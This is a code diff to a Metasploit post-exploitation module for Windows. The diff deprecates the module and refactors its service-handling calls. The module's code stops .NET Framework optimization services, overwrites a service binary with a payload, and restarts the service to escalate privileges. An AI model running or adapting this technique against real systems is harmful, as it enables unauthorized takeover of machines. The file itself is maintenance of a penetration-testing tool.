@@ -8,6 +8,10 @@ require 'rex'
 
 class Metasploit3 < Msf::Post
 
+  require 'msf/core/module/deprecated'
+  include Msf::Module::Deprecated
+  deprecated Date.new(2015, 1, 8), 'exploit/windows/local/service_permissions'
+
   include Msf::Post::Windows::Services
 
   def initialize(info={})
@@ -39,7 +43,7 @@ class Metasploit3 < Msf::Post
 
   def run
     paths = []
-    services = []
+    candidate_services = []
     vuln = ""
     @temp = session.sys.config.getenv('TEMP')
 
@@ -50,16 +54,16 @@ class Metasploit3 < Msf::Post
     print_status("Checking for vulnerable .NET Framework Optimization service")
     print_status("This may take a few minutes.")
     # enumerate the installed .NET versions
-    service_list.each do |service|
-      if service =~ /clr_optimization_.*/
-        info = service_info(service)
-        paths << info['Command']
-        services << service
+    each_service do |service|
+      if service[:name] =~ /clr_optimization_.*/
+        info = service_info(service[:name])
+        paths << info[:path]
+        candidate_services << service[:name]
         begin
-          service_stop(service) # temporarily stop the service
-          print_status("Found #{info['Name']} installed")
+          service_stop(service[:name]) # temporarily stop the service
+          print_status("Found #{service[:name]} installed")
         rescue
-          print_error("We do not appear to have access to stop #{info['Name']}")
+          print_error("We do not appear to have access to stop #{service[:name]}")
         end
       else
         next
@@ -80,17 +84,13 @@ class Metasploit3 < Msf::Post
       payload = setup_exploit
     end
 
-    services.each do |service|
+    candidate_services.each do |service|
       session.railgun.kernel32.CopyFileA(payload, vuln, false)
-      mng = session.railgun.advapi32.OpenSCManagerA(nil,nil,1)
-      if mng['return'].nil?
-        print_error("Cannot open service manager, not enough privileges")
-        return
-      end
-      # restart the service
-      status = service_start(service)
 
-      if status == 0
+      # restart the service
+      status = service_restart(service)
+
+      if status
         print_status("Restarted #{service}")
       else
         print_error("Failed to restart #{service}")
